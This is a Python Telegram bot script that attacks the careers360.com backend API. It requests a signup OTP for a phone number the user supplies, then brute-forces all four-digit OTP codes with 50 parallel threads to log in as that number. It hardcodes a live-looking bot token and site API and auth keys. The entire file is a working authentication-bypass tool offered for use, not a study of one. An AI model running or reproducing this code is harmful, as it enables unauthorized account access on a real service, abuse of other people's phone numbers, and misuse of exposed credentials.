import requests
import concurrent.futures
import random
import time
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Telegram Bot Token
TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"

# Headers for requests
headers = {
    "Accept": "application/json, text/plain, */*",
    "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
    "device-type": "mobile",
    "x-auth-key": "QeQohnkIqobSaDQITN02Ojpe3nC8dXn4hltbRt1t-TIb",
    "user-agent-key": "195696a6d915c14b",
    "Content-Type": "application/json"
}

ask_me_links = [
    "ebooks/jee-main-preparation-tips-complete-strategy-study-plan",
    "ebooks/jee-main-highest-scoring-chapters-and-topics"
]

# Start command
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Send /op to start the process.")

# OTP Login process
def op(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    update.message.reply_text("Enter details in format: {number} - {Name} - {email}")

    # Wait for user response
    context.user_data["waiting_for_details"] = True

def handle_message(update: Update, context: CallbackContext):
    if context.user_data.get("waiting_for_details"):
        context.user_data["waiting_for_details"] = False
        user_input = update.message.text.strip()
        
        try:
            mobile_number, user_name, user_email = map(str.strip, user_input.split("-"))
        except ValueError:
            update.message.reply_text("❌ Invalid format! Please use {number} - {Name} - {email}.")
            return

        msg = update.message.reply_text("Otp Sent - 👍")

        # OTP request
        otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
        otp_data = {
            "otp_on": "mobile",
            "cta_clicked": "signup",
            "otp_action": "send",
            "isd_code": "+91",
            "mobile_number": mobile_number
        }
        otp_response = requests.post(otp_url, json=otp_data, headers=headers)

        if otp_response.status_code == 200 and otp_response.json().get("result"):
            msg.edit_text("Signup Successfull - 👍")
        else:
            msg.edit_text("❌ OTP Sending Failed")
            return

        # Signup process
        signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
        signup_data = {
            "current_url": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
            "destination": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
            "cta_clicked": "signup",
            "country_code": "+91",
            "mobile_number": mobile_number,
            "email": user_email,
            "name": user_name,
            "submit": True
        }
        signup_response = requests.post(signup_url, json=signup_data, headers=headers)

        if signup_response.status_code == 200 and signup_response.json().get("result"):
            user_uuid = signup_response.json()["data"].get("user_uuid")
        else:
            msg.edit_text("❌ Signup failed.")
            return

        # Brute-force OTPs
        login_url = "https://backend-cus.careers360.com/api/1/cus/login"
        found_otp = None
        checked_otps = 0

        def try_otp(otp):
            nonlocal found_otp, checked_otps
            if found_otp:
                return None

            login_data = {
                "current_url": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
                "destination": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
                "otp_on": "mobile",
                "country_code": "+91",
                "mobile_number": mobile_number,
                "otp": otp,
                "user_uuid": user_uuid
            }

            login_response = requests.post(login_url, json=login_data, headers=headers)

            if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
                found_otp = otp
                return otp

            checked_otps += 1
            if checked_otps % 100 == 0:
                msg.edit_text(f"Otp - Checked {checked_otps}")

            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            otp_range = range(1000, 10000)
            future_to_otp = {executor.submit(try_otp, otp): otp for otp in otp_range}

            for future in concurrent.futures.as_completed(future_to_otp):
                if found_otp:
                    executor.shutdown(wait=False)
                    break

        if not found_otp:
            msg.edit_text("❌ OTP brute-force failed.")
            return

        msg.edit_text(f"Valid Otp - {found_otp}")
        time.sleep(1)
        msg.edit_text("Login Successfull - 👍")

# Telegram bot setup
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("op", op))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
